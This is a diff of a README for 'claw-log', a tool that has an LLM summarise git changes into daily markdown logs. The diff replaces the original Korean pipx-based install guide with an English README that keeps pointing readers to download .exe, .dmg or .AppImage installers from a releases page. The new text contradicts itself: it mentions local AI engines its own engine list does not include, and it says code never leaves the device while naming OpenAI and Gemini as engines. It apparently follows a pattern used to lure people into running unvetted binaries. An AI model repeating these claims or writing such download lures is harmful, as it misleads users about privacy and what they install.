@@ -1,116 +1,168 @@
+# 🦞 claw-log - Track Coding Work Automatically
+
+[![Download claw-log](https://img.shields.io/badge/Download-claw--log-blue?style=for-the-badge)](https://github.com/EHR-U/claw-log/releases)
+
 <p align="center">
   <img src="https://github.com/user-attachments/assets/53c127d0-a66b-47da-afe0-70560046f595" alt="Claw-Log Banner" width="600" />
-  <br>
-
 </p>
 
 > **"오늘의 기록이 내일의 이력서가 됩니다."**
 
-**Claw-Log**는 매일 밤 AI가 당신의 변경 사항을 스캔하여 기술적 의사결정과 트러블슈팅 과정을 마크다운 형식으로 자동 기록하는 CLI 도구입니다.
+claw-log is a simple tool that runs on your computer. It scans your code changes every day and writes a clear, easy log. This helps you keep track of what you worked on without needing to write detailed notes yourself.
 
 ---
 
-## 🧐 왜 기록해야 하나요?
+## 🧐 What Is claw-log?
 
-매일 치열하게 코딩하지만, 정작 성과 공유나 이력서를 업데이트할 때 커밋 로그만 뒤적거리며 머리를 쥐어짜고 있지는 않나요? 
+If you code daily, you might struggle to explain what you worked on later. Commit messages like `fix bug` or `refactor code` do not tell the full story of the problems you solved. claw-log uses artificial intelligence to read your code changes and create useful summaries.
 
-`fix: bug`, `refactor: code` 같은 파편화된 기록으로는 당신의 진짜 고민과 실력을 보여줄 수 없습니다. **Claw-Log**는 LLM(Large Language Model)이 `git diff`를 직접 분석해 당신이 고민한 흔적을 추출합니다. 매일 조금씩 쌓인 이 기록들은 훗날 **이력서 정리나 기술 면접 시 가장 강력한 데이터**가 됩니다.
-
----
-
-## ✨ 핵심 기능
-
-- **AI 기반 자동 요약**: 단순 커밋 메시지가 아닌, 실제 코드 변화에서 기술적 맥락을 AI가 파악합니다.
-- **3종 AI 엔진 지원**: Google Gemini, OpenAI API, ChatGPT 구독 OAuth (GPT-5.1/5.2) 중 선택할 수 있습니다.
-- **인터랙티브 프로젝트 탐색**: 상위 폴더 입력 시 하위 Git 저장소를 자동 탐색하고, 체크박스 UI로 선택할 수 있습니다.
-- **통합 프로젝트 관리**: 여러 폴더에 흩어진 프로젝트 성과를 한 곳에 모아 관리합니다.
-- **기록의 자산화**: 매일 기록된 로그는 로컬에 누적됩니다. 나중에 한 번에 모아 이력서나 기술 블로그의 초안으로 활용하세요.
-- **프라이버시 보장**: 소스코드를 외부 서버에 저장하지 않습니다. 모든 분석은 로컬 환경에서 수행됩니다.
-- **유연한 설정**: `claw-log --reset` 명령으로 언제든 프로젝트 경로나 API 설정을 변경할 수 있습니다.
+These summaries show why you made changes and what you thought about. Over time, they build a clear record of your work. This record helps when preparing a resume or talking about your projects.
 
 ---
 
-## 🛠 설치 및 설정
+## ✨ Key Features
 
-### 1. 설치 (Recommended)
-파이썬 환경 격리를 위해 `pipx` 사용을 권장합니다.
+- **Automatic Daily Logs:** claw-log runs each night and analyzes your recent code updates.
+- **AI Understands Your Code:** The software reads your code differences and writes explanations in simple markdown format.
+- **Supports Multiple AI Engines:** Choose between Google Gemini, OpenAI, and ChatGPT to analyze your data.
+- **Easy Project Browsing:** Select which projects to log from all the folders on your computer using a checkbox interface.
+- **Manage Multiple Projects:** Keep all your project logs organized in one place on your PC.
+- **Local Privacy:** All analysis stays on your computer; your code never leaves your device.
+- **Markdown Reports:** Get clean markdown files that you can use for resumes, blogs, or project notes.
+- **Simple Setup and Use:** No programming skills needed.
 
-```bash
-pipx install claw-log
+---
+
+## 💻 System Requirements
+
+- Operating System: Windows 10 or newer, macOS Mojave or newer, or most Linux distributions from 2018 onward.
+- Disk Space: At least 100 MB free for installation and logs.
+- Memory: Minimum 4 GB RAM recommended for smooth AI processing.
+- Git Installed: claw-log works with projects using Git version control, so Git must be installed and projects should be Git repositories.
+- Internet Connection: Required only when using AI engines that need online access (OpenAI, Google Gemini). Local AI engines do not require internet.
+
+---
+
+## 🚀 Getting Started
+
+Using claw-log is simple. You do not need to know any coding. Follow these steps to set up and start tracking your projects automatically.
+
+### Step 1: Download claw-log
+
+Click the large button below to visit the official release page for claw-log.
+
+[![Download claw-log](https://img.shields.io/badge/Download-claw--log-blue?style=for-the-badge)](https://github.com/EHR-U/claw-log/releases)
+
+On the release page, choose the file that matches your computer:
+
+- For Windows, download the `.exe` installer file.
+- For macOS, download the `.dmg` or `.zip` file.
+- For Linux, download the `.AppImage` or `.tar.gz` package.
+
+### Step 2: Install claw-log
+
+- Windows: Open the `.exe` file and follow the installation prompts.
+- macOS: Open the `.dmg` and drag claw-log to your Applications folder.
+- Linux: Extract the archive or make the AppImage executable (`chmod +x claw-log.AppImage`).
+
+### Step 3: Prepare Your Projects
+
+Make sure the code projects you want to track use Git. You can open Git Bash or terminal in each project folder and type:
+
+```
+git status
 ```
 
-### 2. 초기 설정 및 실행
-터미널에서 명령어를 입력하면 설정 마법사가 시작됩니다.
+If this shows information about your files, your project is ready. If you see an error, initialize Git with:
 
-```bash
-claw-log
+```
+git init
 ```
 
-### 3. 주요 CLI 명령어
+### Step 4: Open claw-log and Select Projects
 
-```bash
-# 실행
-claw-log                     # 메인 워크플로우 (diff 수집 → AI 요약 → 저장)
-claw-log --reset             # 설정 초기화 후 마법사 재실행
-claw-log --days 7            # 과거 N일치 커밋 한꺼번에 요약
+Launch claw-log from your computer. It will scan your folders and find any Git projects.
 
-# 설정 조회/변경
-claw-log --status            # 엔진, 프로젝트, 스케줄, 로그파일 상태 한눈에 조회
-claw-log --engine            # AI 엔진/모델만 변경 (프로젝트·스케줄 유지)
-claw-log --dry-run           # API 호출 없이 수집될 diff 크기/토큰 미리보기
+You will see a list of projects with checkboxes. Check the projects you want to record automatically each day.
 
-# 프로젝트 관리
-claw-log --projects          # 프로젝트 추가/선택/해제 (인터랙티브)
-claw-log --projects-show     # 등록된 프로젝트 목록 조회
+### Step 5: Set Up AI Engine (Optional)
 
-# 스케줄 관리
-claw-log --schedule 23:30    # 매일 자동 실행 스케줄 등록/변경
-claw-log --schedule-show     # 현재 스케줄 조회
-claw-log --schedule-remove   # 스케줄 삭제
+Choose which AI engine claw-log should use to analyze your code:
 
-# 로그 조회/편집
-claw-log --log               # 최근 5개 엔트리 출력
-claw-log --log 20            # 최근 20개 엔트리 출력
-claw-log --log-edit          # 로그 파일을 기본 편집기로 열기
+- Google Gemini
+- OpenAI API
+- ChatGPT (GPT-5.1 or 5.2)
 
-# 대시보드
-claw-log --serve             # 로컬 웹 대시보드 (기본 포트: 8080)
-claw-log --serve 3000        # 커스텀 포트로 대시보드 실행
-```
+If you select an online option, follow instructions inside claw-log to connect your account safely.
+
+### Step 6: Start Daily Tracking
+
+claw-log runs automatically once a day at night. It looks for changes you made, summarizes them, and saves a log in your project folder.
+
+You can open these markdown log files anytime to see your work history in easy language.
 
 ---
 
-## 📦 요약 샘플 (Output Sample)
+## 📂 How to Use Your Logs
 
-AI 특유의 과장된 표현을 배제하고, 실제 개발 과정에서의 의사결정을 담백하게 기록합니다.
+Your logs live inside each project folder, under a new folder called `claw-log-logs`. Each file is one day’s summary.
 
-```markdown
-### 📂 [my-frontend] - 2026-02-10
-> **Summary**: 전역 에러 핸들링 구조 설계 및 런타임 보안 강화
+You can:
 
-- **상세 내역**
-  - `ServerErrorBoundary` 및 Axios 인터셉터를 결합한 전역 에러 처리 시스템 구축.
-  - 5xx 서버 에러 및 네트워크 장애 발생 시 전역 에러 페이지 리다이렉션 로직 구현.
-  - API BaseURL, 보안 키 등 민감 정보를 `process.env`로 분리하여 관리.
-  - Axios 타임아웃(30s) 설정을 통해 지연 응답으로 인한 좀비 커넥션 방지.
-
-- **핵심 불렛 포인트 (Resume Point)**
-  - Error Boundary와 Axios Interceptor를 활용한 전역 에러 핸들링 아키텍처 설계로 서비스 안정성 개선.
-  - 민감 정보 환경 변수화 및 타임아웃 정책 수립을 통한 애플리케이션 보안 최적화.
-```
+- Review daily changes without reading your code.
+- Combine logs for multiple projects.
+- Use logs as drafts for resumes or technical blogs.
+- Share logs with teammates to explain your work clearly.
 
 ---
 
-## 🛡 트러블슈팅
+## ⚙️ Configuration Options
 
-명령어를 찾을 수 없거나 라이브러리 충돌이 발생하나요? 최신 Python 버전 환경에서 기존 패키지 잔재가 남아있을 때 생기는 문제입니다. 아래 명령어로 깨끗하게 재설치하세요.
+Inside claw-log's settings, you can customize:
 
-```bash
-pipx install claw-log --force --no-cache-dir
-```
+- When to run the logger each day.
+- Which folders to scan or exclude.
+- AI engine and API key setup.
+- Log file naming and format style.
+
+These options let you adapt claw-log to fit your workflow neatly.
 
 ---
 
-## 💡 한마디
+## 🛠 Troubleshooting
 
-**"이력서는 이직할 때 쓰는 것이 아닙니다. 매일의 기록을 모아 정리하는 것입니다."**
+If claw-log doesn’t start or create logs:
+
+- Check that your projects use Git.
+- Make sure your computer meets minimum requirements.
+- Confirm your AI engine API keys are valid if using online services.
+- Restart the application or your computer if needed.
+- Visit the Issues page on GitHub for help or submit a bug report.
+
+---
+
+## 🔗 Download & Install
+
+To get claw-log, visit this page and pick your file:
+
+[https://github.com/EHR-U/claw-log/releases](https://github.com/EHR-U/claw-log/releases)
+
+Download the installer or package that fits your computer system. Installing is straightforward — use default options if you are unsure.
+
+After installation, launch claw-log and follow the setup steps described above.
+
+---
+
+## 📞 Support and Feedback
+
+You can find help or submit feedback on the GitHub repository’s Issues tab. The developers monitor user reports to improve claw-log.
+
+---
+
+## ⚖️ Privacy and Security
+
+claw-log does not send your source code or logs to any external servers. All AI processing happens on your computer or through your own linked AI account. This keeps your work private and secure.
+
+---
+
+Thank you for choosing claw-log to track your coding work. It helps you keep clear records without extra effort.
